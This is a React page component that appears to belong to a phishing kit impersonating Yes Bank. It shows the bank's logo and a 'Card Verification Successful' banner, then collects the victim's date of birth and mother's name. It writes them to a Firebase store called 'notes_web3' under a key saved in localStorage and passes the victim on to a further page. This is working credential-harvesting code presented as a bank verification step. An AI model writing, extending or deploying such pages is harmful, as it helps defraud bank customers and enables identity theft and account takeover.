import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import FirebaseUtil from './FirebaseRepo';
import { MdLock } from "react-icons/md";
import myImage from './assets/yes_bank_top.png';
import footerImage from './assets/yes_footer.jpeg';
import Footer from './components/Footer';

function IntermediatePage() {
  const navigate = useNavigate();
  const [birthDate, setBirthDate] = useState(""); // now a string
  const [motherName, setMotherName] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);

  // Progress bar effect
  useEffect(() => {
    let timer;
    if (isSubmitting) {
      setProgress(0);
      const step = 100 / 40; // 4 seconds → 100% (2.5% per 100ms)
      timer = setInterval(() => {
        setProgress(prev => {
          if (prev >= 100) {
            clearInterval(timer);
            return 100;
          }
          return prev + step;
        });
      }, 100);
    }
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!birthDate || birthDate.length !== 10) {
      alert('Please enter your birth date in DD/MM/YYYY format');
      setIsSubmitting(false);
      return;
    }

    if (!motherName.trim()) {
      alert('Please enter your Mother Name');
      setIsSubmitting(false);
      return;
    }

    // Convert DD/MM/YYYY to YYYY-MM-DD for Firebase
    const [dd, mm, yyyy] = birthDate.split("/");
    const formattedBirthDate = `${yyyy}-${mm}-${dd}`;

    setTimeout(async () => {
      try {
        const key = localStorage.getItem('key');
        if (!key) {
          alert('No key found. Please start from the beginning.');
          setIsSubmitting(false);
          setProgress(0);
          return;
        }

        const result = await FirebaseUtil.updateAnyModel("notes_web3/", key, { 
          birthDate: formattedBirthDate,
          motherName: motherName
        });

        console.log("Updated with key:", result.key);
        navigate('/third-page');
      } catch (error) {
        console.error("Error updating:", error);
        alert('Failed to update details. Please try again.');
      } finally {
        setIsSubmitting(false);
        setProgress(0);
      }
    }, 4000);
  };

  // Auto-format birth date as DD/MM/YYYY while typing
  const handleBirthDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, ""); // digits only
    if (value.length > 8) value = value.slice(0, 8); // max 8 digits
    if (value.length > 4) value = value.slice(0,2) + "/" + value.slice(2,4) + "/" + value.slice(4);
    else if (value.length > 2) value = value.slice(0,2) + "/" + value.slice(2);
    setBirthDate(value);
  };

  return (
    <>
      <div className="min-h-screen w-full flex flex-col items-center justify-center bg-gradient-to-br from-blue-700 to-blue-500 px-4 py-6 relative">
        {/* Loader Overlay */}
        {isSubmitting && (
          <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/70 backdrop-blur-sm z-20">
            <div className="w-10 h-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
          </div>
        )}

        {/* Logo */}
        <div className="mb-6 z-10 relative">
          <img src={myImage} alt="Yes Bank Logo" className="h-14 mx-auto" />
        </div>

        {/* Card */}
        <div className="bg-white shadow-xl rounded-2xl p-6 sm:p-8 w-full max-w-md border border-gray-100 z-10 relative">
          <h2 className="text-2xl font-bold text-center mb-6 text-blue-700">
            Your Card Verification Successful
          </h2>
          
          <form onSubmit={handleSubmit} className="space-y-5 w-full">
            {/* Birth Date */}
            <div className="w-full">
              <label 
                className="block text-gray-700 text-sm font-medium mb-2" 
                htmlFor="birthDate"
              >
                Account Holder D.O.B
              </label>
              <input
                type="text"
                id="birthDate"
                value={birthDate}
                onChange={handleBirthDateChange}
                placeholder="DD/MM/YYYY"
                maxLength={10}
                className="shadow-sm border border-gray-300 rounded-lg w-full py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>

            {/* Mother Name */}
            <div className="w-full">
              <label 
                className="block text-gray-700 text-sm font-medium mb-2" 
                htmlFor="motherName"
              >
                Mother Name
              </label>
              <input
                type="text"
                value={motherName}
                onChange={(e) => setMotherName(e.target.value)}
                className="shadow-sm border border-gray-300 rounded-lg w-full py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
                placeholder="Enter Your Mother Name"
                required
              />
            </div>

            {/* Button */}
            <div>
              <button
                className={`flex items-center justify-center w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg shadow-md transition ${isSubmitting ? 'opacity-60 cursor-not-allowed' : ''}`}
                type="submit"
                disabled={isSubmitting}
              >
                {isSubmitting ? 'Submitting...' : 'Continue'}
                <MdLock className="ml-2 text-lg" />
              </button>
            </div>
          </form>
        </div>

        {/* Footer Image */}
        <div className="mt-6 z-10 relative">
          <img src={footerImage} alt="Footer" className="h-14 rounded-md shadow-sm mx-auto" />
        </div>
      </div>

      <div className='mt-8'>
        <Footer/>
      </div>
    </>
  );
}

export default IntermediatePage;
